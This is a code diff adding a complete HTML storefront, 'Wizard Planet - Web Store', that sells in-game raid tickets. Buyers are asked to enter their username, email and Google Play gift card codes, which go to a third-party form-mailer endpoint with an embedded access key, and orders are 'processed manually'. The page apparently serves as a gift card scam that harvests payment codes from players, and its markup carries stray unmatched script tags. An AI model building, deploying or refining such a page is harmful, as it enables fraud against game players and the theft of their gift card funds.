@@ -1,0 +1,156 @@
+<script></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wizard Planet - Web Store</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f7;
+            color: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .store-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid #e0e0e6;
+        }
+        h2 {
+            text-align: center;
+            color: #1e7e34;
+            margin-top: 0;
+            font-size: 24px;
+        }
+        p.subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        label {
+            display: block;
+            margin-top: 15px;
+            font-weight: 600;
+            color: #3c4043;
+            font-size: 14px;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            margin-top: 6px;
+            background-color: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            color: #202124;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #1e7e34;
+            background-color: #ffffff;
+        }
+        textarea {
+            resize: vertical;
+            height: 80px;
+        }
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 22px 0;
+            padding: 12px;
+            border-radius: 8px;
+            background-color: #f8f9fa;
+            border: 1px dashed #dadce0;
+        }
+        .logo-label {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .play-logo-btn {
+            display: inline-flex;
+            align-items: center;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+        .play-logo-btn:hover {
+            transform: scale(1.03);
+            opacity: 0.9;
+        }
+        .play-logo-btn img {
+            width: 160px;
+            height: auto;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #1e7e34;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        button[type="submit"]:hover {
+            background-color: #155d25;
+        }
+    </style>
+</head>
+<body>
+
+<div class="store-container">
+    <h2>Wizard Planet - Web Store</h2>
+    <p class="subtitle">Submit your code below. Orders are processed manually.</p>
+
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="2153b8c2-83d4-49b7-852d-cc116dea1f87">
+        <input type="hidden" name="subject" value="New Raid Ticket Order Submission">
+
+        <label for="username">In-Game Username:</label>
+        <input type="text" id="username" name="username" placeholder="Enter your exact game name" required>
+
+        <label for="email">Your Email Address:</label>
+        <input type="email" id="email" name="email" placeholder="player@email.com" required>
+
+        <label for="package">Select Raid Ticket Package:</label>
+        <select id="package" name="package" required>
+            <option value="100_tickets_2.50">100 Raid Tickets — $2.50</option>
+            <option value="200_tickets_4.50">200 Raid Tickets — $4.50</option>
+            <option value="500_tickets_9.00">500 Raid Tickets — $9.00</option>
+        </select>
+
+        <div class="logo-container">
+            <span class="logo-label">Need a gift card? Click below to buy:</span>
+            <a href="https://play.google.com/about/giftcards/" target="_blank" class="play-logo-btn" title="Buy Google Play Gift Cards">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Google_Play_2022_logo.svg" alt="Get it on Google Play">
+            </a>
+        </div>
+
+        <label for="giftcard_code">Google Play Gift Card Code(s):</label>
+        <textarea id="giftcard_code" name="giftcard_code" placeholder="XXXX-XXXX-XXXX-XXXX" required></textarea>
+
+        <button type="submit">Submit Order</button>
+    </form>
+</div>
+
+</body>
+</html>
+</script>
